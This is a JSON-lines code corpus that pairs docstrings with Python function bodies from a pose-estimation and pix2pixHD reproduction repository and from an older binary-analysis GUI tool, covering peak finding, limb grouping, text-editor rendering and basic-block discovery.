{"docstring": "\"\"\"\nNonMaximaSuppression: find peaks (local maxima) in a set of grayscale images\n:param heatmaps: set of grayscale images on which to find local maxima (3d np.array,\nwith dimensions image_height x image_width x num_heatmaps)\n:param upsampFactor: Size ratio between CPM heatmap output and the input image size.\nEg: upsampFactor=16 if original image was 480x640 and heatmaps are 30x40xN\n:param bool_refine_center: Flag indicating whether:\n - False: Simply return the low-res peak found upscaled by upsampFactor (subject to grid-snap)\n - True: (Recommended, very accurate) Upsample a small patch around each low-res peak and\n fine-tune the location of the peak at the resolution of the original input image\n:param bool_gaussian_filt: Flag indicating whether to apply a 1d-GaussianFilter (smoothing)\nto each upsampled patch before fine-tuning the location of each peak.\n:return: a NUM_JOINTS x 4 np.array where each row represents a joint type (0=nose, 1=neck...)\nand the columns indicate the {x,y} position, the score (probability) and a unique id (counter)\n\"\"\"\n# MODIFIED BY CARLOS: Instead of upsampling the heatmaps to heatmap_avg and\n# then performing NMS to find peaks, this step can be sped up by ~25-50x by:\n# (9-10ms [with GaussFilt] or 5-6ms [without GaussFilt] vs 250-280ms on RoG\n# 1. Perform NMS at (low-res) CPM's output resolution\n# 1.1. Find peaks using scipy.ndimage.filters.maximum_filter\n# 2. Once a peak is found, take a patch of 5x5 centered around the peak, upsample it, and\n# fine-tune the position of the actual maximum.\n#  '-> That's equivalent to having found the peak on heatmap_avg, but much faster because we only\n#      upsample and scan the 5x5 patch instead of the full (e.g.) 480x640\n\n", "func_signal": "def NMS(param, heatmaps, upsampFactor=1., bool_refine_center=True, bool_gaussian_filt=False):\n", "code": "joint_list_per_joint_type = []\ncnt_total_joints = 0\n\n# For every peak found, win_size specifies how many pixels in each\n# direction from the peak we take to obtain the patch that will be\n# upsampled. Eg: win_size=1 -> patch is 3x3; win_size=2 -> 5x5\n# (for BICUBIC interpolation to be accurate, win_size needs to be >=2!)\nwin_size = 2\n\nfor joint in range(NUM_JOINTS):\n    map_orig = heatmaps[:, :, joint]\n    peak_coords = find_peaks(param, map_orig)\n    peaks = np.zeros((len(peak_coords), 4))\n    for i, peak in enumerate(peak_coords):\n        if bool_refine_center:\n            x_min, y_min = np.maximum(0, peak - win_size)\n            x_max, y_max = np.minimum(\n                np.array(map_orig.T.shape) - 1, peak + win_size)\n\n            # Take a small patch around each peak and only upsample that\n            # tiny region\n            patch = map_orig[y_min:y_max + 1, x_min:x_max + 1]\n            map_upsamp = cv2.resize(\n                patch, None, fx=upsampFactor, fy=upsampFactor, interpolation=cv2.INTER_CUBIC)\n\n            # Gaussian filtering takes an average of 0.8ms/peak (and there might be\n            # more than one peak per joint!) -> For now, skip it (it's\n            # accurate enough)\n            map_upsamp = gaussian_filter(\n                map_upsamp, sigma=3) if bool_gaussian_filt else map_upsamp\n\n            # Obtain the coordinates of the maximum value in the patch\n            location_of_max = np.unravel_index(\n                map_upsamp.argmax(), map_upsamp.shape)\n            # Remember that peaks indicates [x,y] -> need to reverse it for\n            # [y,x]\n            location_of_patch_center = compute_resized_coords(\n                peak[::-1] - [y_min, x_min], upsampFactor)\n            # Calculate the offset wrt to the patch center where the actual\n            # maximum is\n            refined_center = (location_of_max - location_of_patch_center)\n            peak_score = map_upsamp[location_of_max]\n        else:\n            refined_center = [0, 0]\n            # Flip peak coordinates since they are [x,y] instead of [y,x]\n            peak_score = map_orig[tuple(peak[::-1])]\n        peaks[i, :] = tuple([int(round(x)) for x in compute_resized_coords(\n            peak_coords[i], upsampFactor) + refined_center[::-1]]) + (peak_score, cnt_total_joints)\n        cnt_total_joints += 1\n    joint_list_per_joint_type.append(peaks)\n\nreturn joint_list_per_joint_type", "path": "src\\PoseEstimation\\network\\post.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "\"\"\"\nAssociate limbs belonging to the same person together.\n:param connected_limbs: See 'return' doc of find_connected_joints()\n:param joint_list: unravel'd version of joint_list_per_joint [See 'return' doc of NMS()]\n:return: 2d np.array of size num_people x (NUM_JOINTS+2). For each person found:\n# First NUM_JOINTS columns contain the index (in joint_list) of the joints associated\nwith that person (or -1 if their i-th joint wasn't found)\n# 2nd-to-last column: Overall score of the joints+limbs that belong to this person\n# Last column: Total count of joints found for this person\n\"\"\"\n", "func_signal": "def group_limbs_of_same_person(connected_limbs, joint_list):\n", "code": "person_to_joint_assoc = []\n\nfor limb_type in range(NUM_LIMBS):\n    joint_src_type, joint_dst_type = joint_to_limb_heatmap_relationship[limb_type]\n\n    for limb_info in connected_limbs[limb_type]:\n        person_assoc_idx = []\n        for person, person_limbs in enumerate(person_to_joint_assoc):\n            if person_limbs[joint_src_type] == limb_info[0] or person_limbs[joint_dst_type] == limb_info[1]:\n                person_assoc_idx.append(person)\n\n        # If one of the joints has been associated to a person, and either\n        # the other joint is also associated with the same person or not\n        # associated to anyone yet:\n        if len(person_assoc_idx) == 1:\n            person_limbs = person_to_joint_assoc[person_assoc_idx[0]]\n            # If the other joint is not associated to anyone yet,\n            if person_limbs[joint_dst_type] != limb_info[1]:\n                # Associate it with the current person\n                person_limbs[joint_dst_type] = limb_info[1]\n                # Increase the number of limbs associated to this person\n                person_limbs[-1] += 1\n                # And update the total score (+= heatmap score of joint_dst\n                # + score of connecting joint_src with joint_dst)\n                person_limbs[-2] += joint_list[limb_info[1]\n                                               .astype(int), 2] + limb_info[2]\n        elif len(person_assoc_idx) == 2:  # if found 2 and disjoint, merge them\n            person1_limbs = person_to_joint_assoc[person_assoc_idx[0]]\n            person2_limbs = person_to_joint_assoc[person_assoc_idx[1]]\n            membership = ((person1_limbs >= 0) & (person2_limbs >= 0))[:-2]\n            if not membership.any():  # If both people have no same joints connected, merge them into a single person\n                # Update which joints are connected\n                person1_limbs[:-2] += (person2_limbs[:-2] + 1)\n                # Update the overall score and total count of joints\n                # connected by summing their counters\n                person1_limbs[-2:] += person2_limbs[-2:]\n                # Add the score of the current joint connection to the\n                # overall score\n                person1_limbs[-2] += limb_info[2]\n                person_to_joint_assoc.pop(person_assoc_idx[1])\n            else:  # Same case as len(person_assoc_idx)==1 above\n                person1_limbs[joint_dst_type] = limb_info[1]\n                person1_limbs[-1] += 1\n                person1_limbs[-2] += joint_list[limb_info[1]\n                                                .astype(int), 2] + limb_info[2]\n        else:  # No person has claimed any of these joints, create a new person\n            # Initialize person info to all -1 (no joint associations)\n            row = -1 * np.ones(20)\n            # Store the joint info of the new connection\n            row[joint_src_type] = limb_info[0]\n            row[joint_dst_type] = limb_info[1]\n            # Total count of connected joints for this person: 2\n            row[-1] = 2\n            # Compute overall score: score joint_src + score joint_dst + score connection\n            # {joint_src,joint_dst}\n            row[-2] = sum(joint_list[limb_info[:2].astype(int), 2]\n                          ) + limb_info[2]\n            person_to_joint_assoc.append(row)\n\n# Delete people who have very few parts connected\npeople_to_delete = []\nfor person_id, person_info in enumerate(person_to_joint_assoc):\n    if person_info[-1] < 3 or person_info[-2] / person_info[-1] < 0.2:\n        people_to_delete.append(person_id)\n# Traverse the list in reverse order so we delete indices starting from the\n# last one (otherwise, removing item for example 0 would modify the indices of\n# the remaining people to be deleted!)\nfor index in people_to_delete[::-1]:\n    person_to_joint_assoc.pop(index)\n\n# Appending items to a np.array can be very costly (allocating new memory, copying over the array, then adding new row)\n# Instead, we treat the set of people as a list (fast to append items) and\n# only convert to np.array at the end\nreturn np.array(person_to_joint_assoc)", "path": "src\\PoseEstimation\\network\\post.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# Scale and translate\n", "func_signal": "def imcv2_affine_trans(im, flip=None, im_shape=None, rotate=False, max_scale=1.5):\n", "code": "h, w = im.shape[:2] if im_shape is None else im_shape[:2]\nscale = np.random.uniform(1., max_scale)\n\ndegree = np.random.uniform(-5, 5) if rotate else None\n\nmax_offx = (scale - 1.) * w\nmax_offy = (scale - 1.) * h\noffx = int(np.random.uniform() * max_offx)\noffy = int(np.random.uniform() * max_offy)\n\nflip_ = np.random.uniform() > 0.5 if flip is None else flip\n\nif im is not None:\n    im = apply_affine(im, scale, [offx, offy, degree], flip_, im_shape)\n\nreturn im, [scale, [offx, offy, degree], flip_, im_shape]", "path": "src\\PoseEstimation\\network\\im_transform.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# self.opt = opt\n", "func_signal": "def __init__(self, opt):\n", "code": "self.tf_log = opt.tf_log\nself.use_html = opt.isTrain and not opt.no_html\nself.win_size = opt.display_winsize\nself.name = opt.name\nif self.tf_log:\n    import tensorflow as tf\n    self.tf = tf\n    self.log_dir = os.path.join(opt.checkpoints_dir, opt.name, 'logs')\n    self.writer = tf.summary.FileWriter(self.log_dir)\n\nif self.use_html:\n    self.web_dir = os.path.join(opt.checkpoints_dir, opt.name, 'web')\n    self.img_dir = os.path.join(self.web_dir, 'images')\n    print('create web directory %s...' % self.web_dir)\n    util.mkdirs([self.web_dir, self.img_dir])\nself.log_name = os.path.join(opt.checkpoints_dir, opt.name, 'loss_log.txt')\nwith open(self.log_name, \"a\") as log_file:\n    now = time.strftime(\"%c\")\n    log_file.write('================ Training Loss (%s) ================\\n' % now)", "path": "src\\pix2pixHD\\util\\visualizer.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# after fixing the global generator for a number of iterations, also start finetuning it\n", "func_signal": "def update_fixed_params(self):\n", "code": "params = list(self.netG.parameters())\nif self.gen_features:\n    params += list(self.netE.parameters())           \nself.optimizer_G = torch.optim.Adam(params, lr=self.opt.lr, betas=(self.opt.beta1, 0.999))\nif self.opt.verbose:\n    print('------------ Now also finetuning global generator -----------')", "path": "src\\pix2pixHD\\models\\pix2pixHD_model.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "\"\"\"\nget meta information\n\"\"\"\n", "func_signal": "def get_anno(self, meta_data):\n", "code": "anno = dict()\nanno['dataset'] = meta_data['dataset']\nanno['img_height'] = int(meta_data['img_height'])\nanno['img_width'] = int(meta_data['img_width'])\n\nanno['isValidation'] = meta_data['isValidation']\nanno['people_index'] = int(meta_data['people_index'])\nanno['annolist_index'] = int(meta_data['annolist_index'])\n\n# (b) objpos_x (float), objpos_y (float)\nanno['objpos'] = np.array(meta_data['objpos'])\nanno['scale_provided'] = meta_data['scale_provided']\nanno['joint_self'] = np.array(meta_data['joint_self'])\n\nanno['numOtherPeople'] = int(meta_data['numOtherPeople'])\nanno['num_keypoints_other'] = np.array(\n    meta_data['num_keypoints_other'])\nanno['joint_others'] = np.array(meta_data['joint_others'])\nanno['objpos_other'] = np.array(meta_data['objpos_other'])\nanno['scale_provided_other'] = meta_data['scale_provided_other']\nanno['bbox_other'] = meta_data['bbox_other']\nanno['segment_area_other'] = meta_data['segment_area_other']\n\nif anno['numOtherPeople'] == 1:\n    anno['joint_others'] = np.expand_dims(anno['joint_others'], 0)\n    anno['objpos_other'] = np.expand_dims(anno['objpos_other'], 0)\nreturn anno", "path": "src\\PoseEstimation\\training\\datasets\\coco_data\\COCO_data_pipeline.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# TODO: extract 16 layers of activations and return weighted L1-loss.\n", "func_signal": "def forward(self, input, target):\n", "code": "loss = torch.tensor(0.).to(self.device)\nfor name, module in self.vgg_features._modules.items():\n    input = module(input)\n    target = module(target)\n    if name in self.layer_name_mapping:\n        loss += self.loss_function(input, target)\nreturn 0.1 * loss  # recon loss should be on the same level as gen loss...", "path": "face_enhancer\\utils\\perceptual_loss.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "\"\"\"\nGiven a (grayscale) image, find local maxima whose value is above a given\nthreshold (param['thre1'])\n:param img: Input image (2d array) where we want to find peaks\n:return: 2d np.array containing the [x,y] coordinates of each peak found\nin the image\n\"\"\"\n\n", "func_signal": "def find_peaks(param, img):\n", "code": "peaks_binary = (maximum_filter(img, footprint=generate_binary_structure(\n    2, 1)) == img) * (img > param['thre1'])\n# Note reverse ([::-1]): we return [[x y], [x y]...] instead of [[y x], [y\n# x]...]\nreturn np.array(np.nonzero(peaks_binary)[::-1]).T", "path": "src\\PoseEstimation\\network\\post.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "\"\"\"\nInit a sDataloader from an existing Dataloader\n:param loader: an instance of Dataloader\n:type loader: DataLoader\n:return: a new instance of sDataloader\n:rtype: sDataLoader\n\"\"\"\n", "func_signal": "def copy(loader):\n", "code": "if not isinstance(loader, DataLoader):\n    logger.warning('loader should be an instance of Dataloader, but got {}'.format(type(loader)))\n    return loader\n\nnew_loader = sDataLoader(loader.dataset)\nfor k, v in loader.__dict__.items():\n    setattr(new_loader, k, v)\nreturn new_loader", "path": "src\\PoseEstimation\\training\\datasets\\dataloader.py", "repo_name": "yanx27/EverybodyDanceNow_reproduce_pytorch", "stars": 597, "license": "mit", "language": "python", "size": 356108}
{"docstring": "# Find sections that hold data backed by updated regions of the file\n", "func_signal": "def notify_data_write(self, data, ofs, contents):\n", "code": "for i in self.program_headers:\n\tif ((ofs + len(contents)) > i.offset) and (ofs < (i.offset + i.file_size)) and (i.memory_size != 0):\n\t\t# This section has been updated, compute which region has been changed\n\t\tfrom_start = ofs - i.offset\n\t\tdata_ofs = 0\n\t\tlength = len(contents)\n\t\tif from_start < 0:\n\t\t\tlength += from_start\n\t\t\tdata_ofs -= from_start\n\t\t\tfrom_start = 0\n\t\tif (from_start + length) > i.file_size:\n\t\t\tlength = i.file_size - from_start\n\n\t\t# Notify callbacks\n\t\tif length > 0:\n\t\t\tfor cb in self.callbacks:\n\t\t\t\tif hasattr(cb, \"notify_data_write\"):\n\t\t\t\t\tcb.notify_data_write(self, i.virtual_addr + from_start,\n\t\t\t\t\t\tcontents[data_ofs:(data_ofs + length)])", "path": "ElfFile.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Rerender both the old caret position and the new caret position\n", "func_signal": "def updateCaret(self):\n", "code": "yofs = self.verticalScrollBar().value()\nself.viewport().update(0, 1 + (self.prevCursorY - yofs) * self.charHeight,\n\tself.viewport().size().width(), self.charHeight + 2)\nself.viewport().update(0, 1 + (self.cursorY - yofs) * self.charHeight,\n\tself.viewport().size().width(), self.charHeight + 2)", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Must save file before running it\n", "func_signal": "def python_run(self):\n", "code": "index = self.focus_tab.currentIndex()\nif index == -1:\n\treturn\nif not self.save_tab(index):\n\treturn\nif os.name != \"nt\":\n\tself.focus_tab.widget(index).run_in_terminal([\"/usr/bin/env\", \"python\", self.focus_tab.widget(index).filename])", "path": "binja.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# The docs and actual behavior conflict here, it might break if we don't be very very\n# careful and paranoid, handling either return value order\n", "func_signal": "def selectFont(self):\n", "code": "first, second = QFontDialog.getFont(self.font)\n\nif first and second:\n\tif hasattr(first, 'family'):\n\t\tself.font = first\n\telse:\n\t\tself.font = second\n\tself.fontLabel.setText(\"%s %d\" % (self.font.family(), self.font.pointSize()))\n\tself.fontLabel.setFont(self.font)", "path": "Preferences.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Compute selection range\n", "func_signal": "def get_selection_range_relative(self):\n", "code": "selStart = (self.text.lines[self.selectionStartY].offset + self.selectionStartX)\nselEnd = (self.text.lines[self.cursorY].offset + self.cursorX)\nif selEnd < selStart:\n\tt = selEnd\n\tselEnd = selStart\n\tselStart = t\nreturn (selStart, selEnd)", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Figure out how lines are affected by the insertion\n", "func_signal": "def handle_insert(self, offset, contents):\n", "code": "line = self.offset_to_line(offset)\nfirst_line = line\ni = 0\nwhile i < len(contents):\n\tif (contents[i:i+2] == '\\r\\n') or (contents[i:i+2] == '\\n\\r'):\n\t\t# Inserting two character newline, split current line into two\n\t\tx = (offset + i) - self.lines[line].offset\n\t\tremaining = self.lines[line].length - x\n\t\tnext_line = TextLine(offset + i + 2, remaining, 0, [], self.lines[line].newline_length)\n\t\tself.lines[line].length = x\n\t\tself.lines[line].newline_length = 2\n\t\tline += 1\n\t\tself.lines.insert(line, next_line)\n\t\ti += 2\n\telif (contents[i] == '\\r') or (contents[i] == '\\n'):\n\t\t# Inserting one character newline, split current line into two\n\t\tx = (offset + i) - self.lines[line].offset\n\t\tremaining = self.lines[line].length - x\n\t\tnext_line = TextLine(offset + i + 1, remaining, 0, [], self.lines[line].newline_length)\n\t\tself.lines[line].length = x\n\t\tself.lines[line].newline_length = 1\n\t\tline += 1\n\t\tself.lines.insert(line, next_line)\n\t\ti += 1\n\telse:\n\t\t# Normal character, make current line longer\n\t\tself.lines[line].length += 1\n\t\ti += 1\n\n# Rebase remaining lines to account for insertion\nif (line + 1) < len(self.lines):\n\tself.rebase_lines_absolute(line + 1, self.lines[line].offset + self.lines[line].length +\n\t\tself.lines[line].newline_length)\n\nreturn first_line, line", "path": "TextLines.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Compute number of rows and columns\n", "func_signal": "def adjustSize(self, width, height):\n", "code": "self.rows = len(self.text.lines)\nself.cols = self.text.max_line_width + 1\nself.visibleRows = int((height - 4) / self.charHeight)\nself.visibleCols = int((width - 4) / self.charWidth) - 7\n\n# Update scroll bar information\nself.verticalScrollBar().setPageStep(self.visibleRows)\nself.verticalScrollBar().setRange(0, self.rows - self.visibleRows)\nself.horizontalScrollBar().setPageStep(self.visibleCols)\nself.horizontalScrollBar().setRange(0, self.cols - self.visibleCols)", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Reset block information in case we are reanalyzing an updated function\n", "func_signal": "def findBasicBlocks(self):\n", "code": "self.blocks = {}\nself.plt = False\nself.ready = False\nself.update_id = self.analysis.get_next_update_id()\n\n# Create initial basic block and add it to the queue\nblock = BasicBlock(self.analysis, self.exe, self.entry)\nblock.header_text.lines += [[[self.name + \":\", QColor(192, 0, 0)]]]\nblock.header_text.tokens += [[[0, len(self.name), \"ptr\", self.entry, self.name]]]\nqueue = [block]\nknown_instrs = {}\n\n# Process until all blocks are found\nwhile len(queue) > 0:\n\tblock = queue.pop()\n\n\t# Find instructions for this block\n\tblock.populate(known_instrs)\n\tself.blocks[block.entry] = block\n\n\t# Follow block exits\n\tfor edge in block.exits:\n\t\talready_found = edge in self.blocks\n\t\tfor i in queue:\n\t\t\tif i.entry == edge:\n\t\t\t\talready_found = True\n\t\tif not already_found:\n\t\t\tif edge in known_instrs:\n\t\t\t\t# Address is within another basic block, split the block so that\n\t\t\t\t# the new edge can point to a basic block as well\n\t\t\t\tblock = known_instrs[edge]\n\t\t\t\tfor i in range(0, len(block.instrs)):\n\t\t\t\t\tif block.instrs[i].addr == edge:\n\t\t\t\t\t\tbreak\n\n\t\t\t\tnew_block = BasicBlock(self.analysis, self.exe, edge)\n\t\t\t\tnew_block.exits = block.exits\n\t\t\t\tnew_block.true_path = block.true_path\n\t\t\t\tnew_block.false_path = block.false_path\n\t\t\t\tnew_block.instrs = block.instrs[i:]\n\t\t\t\tfor instr in new_block.instrs:\n\t\t\t\t\tknown_instrs[instr.addr] = new_block\n\t\t\t\tself.blocks[edge] = new_block\n\n\t\t\t\tblock.exits = [edge]\n\t\t\t\tblock.true_path = None\n\t\t\t\tblock.false_path = None\n\t\t\t\tblock.instrs = block.instrs[0:i]\n\t\t\telse:\n\t\t\t\t# New basic block\n\t\t\t\tblock = BasicBlock(self.analysis, self.exe, edge)\n\t\t\t\tself.blocks[edge] = block\n\t\t\t\tknown_instrs[edge] = block\n\t\t\t\tqueue += [block]\n\n# Set previous block list for each block\nfor block in self.blocks.values():\n\tblock.prev = []\nfor block in self.blocks.values():\n\tfor exit in block.exits:\n\t\tself.blocks[exit].prev.append(block)\n\nif (len(self.blocks) == 1) and (len(block.instrs) == 1) and (block.instrs[0].plt != None):\n\t# Function is a trampoline to a PLT entry\n\tself.rename(block.instrs[0].plt)\n\tself.plt = True\n\tself.exe.create_symbol(self.entry, self.name)", "path": "Analysis.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Figure out how lines are affected by the delete, process lines until deleted range is exhausted\n", "func_signal": "def handle_delete(self, offset, size):\n", "code": "line = self.offset_to_line(offset)\nwhile size > 0:\n\tx = offset - self.lines[line].offset\n\tif size > (self.lines[line].length - x):\n\t\tline_remaining = (self.lines[line].length + self.lines[line].newline_length - x)\n\t\tif size >= line_remaining:\n\t\t\t# Removing the entire remaining part of the line, combine with next line\n\t\t\tto_remove = line_remaining\n\t\t\tif line + 1 < len(self.lines):\n\t\t\t\tself.lines[line].length = x + self.lines[line + 1].length\n\t\t\t\tself.lines[line].newline_length = self.lines[line + 1].newline_length\n\t\t\t\tdel(self.lines[line + 1])\n\t\t\telse:\n\t\t\t\tself.lines[line].length = x\n\t\t\t\tself.lines[line].newline_length = 0\n\t\telse:\n\t\t\t# Removing part of the newline\n\t\t\tself.newline_length = line_remaining - size\n\t\t\tto_remove = size\n\t\tself.rebase_lines(line + 1, -to_remove)\n\t\tsize -= to_remove\n\telse:\n\t\t# Removing part of the line\n\t\tself.lines[line].length -= size\n\t\tself.rebase_lines(line + 1, -size)\n\t\tsize = 0\nreturn line", "path": "TextLines.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
{"docstring": "# Initialize painter\n", "func_signal": "def paintEvent(self, event):\n", "code": "p = QPainter(self.viewport())\np.setFont(self.font)\n\nxofs = self.horizontalScrollBar().value()\nyofs = self.verticalScrollBar().value()\n\n# Compute range that needs to be updated\ntopY = event.rect().y()\nbotY = topY + event.rect().height()\ntopY = (topY - 2) / self.charHeight\nbotY = ((botY - 2) / self.charHeight) + 1\n\n# Compute selection range\nselection = False\nselStart, selEnd = self.get_selection_range_relative()\nif selEnd != selStart:\n\tselection = True\n\nif selection:\n\t# Find extents of selection rectangle\n\tstartY = self.text.offset_to_line(selStart)\n\tstartX = selStart - self.text.lines[startY].offset\n\tstartCol = self.text.lines[startY].offset_to_col(startX)\n\tendY = self.text.offset_to_line(selEnd)\n\tendX = selEnd - self.text.lines[endY].offset\n\tendCol = self.text.lines[endY].offset_to_col(endX)\n\tstartCol -= xofs\n\tendCol -= xofs\n\tstartY -= yofs\n\tendY -= yofs\n\n\tif startCol < 0:\n\t\tstartCol = 0\n\tif endCol < 0:\n\t\tendCol = 0\n\n\t# Cursor on hex side, draw filled background\n\tp.setPen(QColor(192, 192, 192))\n\tp.setBrush(QColor(192, 192, 192))\n\tif startY == endY:\n\t\tp.drawRect(2 + (7 + startCol) * self.charWidth, 1 + startY * self.charHeight,\n\t\t\t(endCol - startCol) * self.charWidth, self.charHeight + 1)\n\telse:\n\t\tp.drawRect(2 + (7 + startCol) * self.charWidth, 1 + startY * self.charHeight,\n\t\t\t(event.rect().x() + event.rect().width()) - startCol * self.charWidth, self.charHeight + 1)\n\t\tif endCol > 0:\n\t\t\tp.drawRect(2 + 7 * self.charWidth, 1 + endY * self.charHeight,\n\t\t\t\tendCol * self.charWidth, self.charHeight + 1)\n\tif (endY - startY) > 1:\n\t\tp.drawRect(2 + 7 * self.charWidth, 1 + (startY + 1) * self.charHeight,\n\t\t\tevent.rect().x() + event.rect().width(), ((endY - startY) - 1) * self.charHeight + 1)\n\n\tself.selectionVisible = True\n\np.setPen(QColor(0, 128, 128))\np.drawLine(5 + 5 * self.charWidth, event.rect().y(), 5 + 5 * self.charWidth, event.rect().y() + event.rect().height())\n\n# Paint each line\nfor y in range(topY, botY):\n\t# Skip if line is invalid\n\tif (y + yofs) < 0:\n\t\tcontinue\n\tif (y + yofs) >= len(self.text.lines):\n\t\tcontinue\n\tlineAddr = self.text.lines[y + yofs].offset + self.data.start()\n\tif lineAddr > self.data.end():\n\t\tbreak\n\n\t# Draw line number\n\tp.setPen(QColor(0, 128, 128))\n\tp.drawText(2, 2 + y * self.charHeight + self.charOffset + self.baseline, \"%5d\" % (y + yofs + 1))\n\n\tif lineAddr == self.data.end():\n\t\tbreak\n\n\t# Get data for the line\n\tbytes = self.data.read(lineAddr, self.text.lines[y + yofs].length)\n\tmodifications = self.data.get_modification(lineAddr, self.text.lines[y + yofs].length)\n\n\tmodification = DATA_ORIGINAL\n\tfor char_mod in modifications:\n\t\tif (char_mod == DATA_INSERTED) and (modification == DATA_ORIGINAL):\n\t\t\tmodification = DATA_INSERTED\n\t\telif char_mod == DATA_CHANGED:\n\t\t\tmodification = DATA_CHANGED\n\n\tstyle = HIGHLIGHT_NONE\n\tp.setPen(Qt.black)\n\ttokens = self.text.lines[y + yofs].tokens\n\tcur_token = \"\"\n\tcol = 0\n\n\t# Paint line\n\tfor i in xrange(0, len(bytes)):\n\t\tchar_style = HIGHLIGHT_NONE\n\t\tfor token in tokens:\n\t\t\tif (i >= token.start) and (i < (token.start + token.length)):\n\t\t\t\tchar_style = token.state.style\n\t\t\t\tbreak\n\n\t\tif char_style != style:\n\t\t\t# Style changed, first render queued text\n\t\t\tif len(cur_token) > 0:\n\t\t\t\tif col < xofs:\n\t\t\t\t\t# This token is scrolled off the screen to the left\n\t\t\t\t\tif (xofs - col) >= len(cur_token):\n\t\t\t\t\t\tcol += len(cur_token)\n\t\t\t\t\t\tcur_token = \"\"\n\t\t\t\t\telse:\n\t\t\t\t\t\tcur_token = cur_token[xofs - col:]\n\t\t\t\t\t\tcol = xofs\n\t\t\t\tp.drawText(2 + (7 + col - xofs) * self.charWidth, 2 + y *\n\t\t\t\t\tself.charHeight + self.charOffset + self.baseline, cur_token)\n\t\t\t\tcol += len(cur_token)\n\t\t\t\tcur_token = \"\"\n\n\t\t\tstyle = char_style\n\n\t\t\t# Set up for rendering with the new style\n\t\t\tif style == HIGHLIGHT_COMMENT:\n\t\t\t\tp.setPen(QColor(0, 0, 255))\n\t\t\t\tp.setFont(self.font)\n\t\t\telif style == HIGHLIGHT_KEYWORD:\n\t\t\t\tp.setPen(QColor(192, 0, 0))\n\t\t\t\tp.setFont(self.boldFont)\n\t\t\telif style == HIGHLIGHT_IDENTIFIER:\n\t\t\t\tp.setPen(QColor(0, 128, 128))\n\t\t\t\tp.setFont(self.font)\n\t\t\telif style == HIGHLIGHT_STRING:\n\t\t\t\tp.setPen(QColor(128, 128, 0))\n\t\t\t\tp.setFont(self.font)\n\t\t\telif style == HIGHLIGHT_ESCAPE:\n\t\t\t\tp.setPen(QColor(255, 0, 0))\n\t\t\t\tp.setFont(self.font)\n\t\t\telif style == HIGHLIGHT_VALUE:\n\t\t\t\tp.setPen(QColor(0, 128, 0))\n\t\t\t\tp.setFont(self.font)\n\t\t\telif style == HIGHLIGHT_DIRECTIVE:\n\t\t\t\tp.setPen(QColor(128, 0, 128))\n\t\t\t\tp.setFont(self.boldFont)\n\t\t\telse:\n\t\t\t\tp.setPen(Qt.black)\n\t\t\t\tp.setFont(self.font)\n\n\t\tif bytes[i] == '\\t':\n\t\t\tcur_token += ' ' * (self.text.tab_width - ((col + len(cur_token)) % self.text.tab_width))\n\t\telif bytes[i] == '\\x00':\n\t\t\t# Null bytes will terminate the string when attempting to render, replace with a space\n\t\t\tcur_token += ' '\n\t\telse:\n\t\t\tcur_token += bytes[i]\n\n\tif len(cur_token) != 0:\n\t\tif col < xofs:\n\t\t\t# This token is scrolled off the screen to the left\n\t\t\tif (xofs - col) >= len(cur_token):\n\t\t\t\tcol += len(cur_token)\n\t\t\t\tcur_token = \"\"\n\t\t\telse:\n\t\t\t\tcur_token = cur_token[xofs - col:]\n\t\t\t\tcol = xofs\n\t\tp.drawText(2 + (7 + col - xofs) * self.charWidth, 2 + y * self.charHeight +\n\t\t\tself.charOffset + self.baseline, cur_token)\n\n\tp.setFont(self.font)\n\n# Draw caret if visible\nif self.caretVisible and not selection:\n\tif self.caretBlink:\n\t\t# Draw inverted caret over selected character\n\t\tif self.x11:\n\t\t\tp.setCompositionMode(QPainter.RasterOp_SourceXorDestination)\n\t\telse:\n\t\t\tp.setCompositionMode(QPainter.CompositionMode_Difference)\n\t\tp.setPen(Qt.NoPen)\n\t\tp.setBrush(Qt.white)\n\t\tcaret_width = 2\n\t\tcaret_ofs = -1\n\t\tp.drawRect(2 + (7 + self.cursorCol - xofs) * self.charWidth + caret_ofs,\n\t\t\t1 + (self.cursorY - yofs) * self.charHeight, caret_width, self.charHeight + 1)\n\n\tself.prevCursorY = self.cursorY", "path": "TextEditor.py", "repo_name": "Vector35/deprecated-binaryninja-python", "stars": 517, "license": "gpl-2.0", "language": "python", "size": 1039}
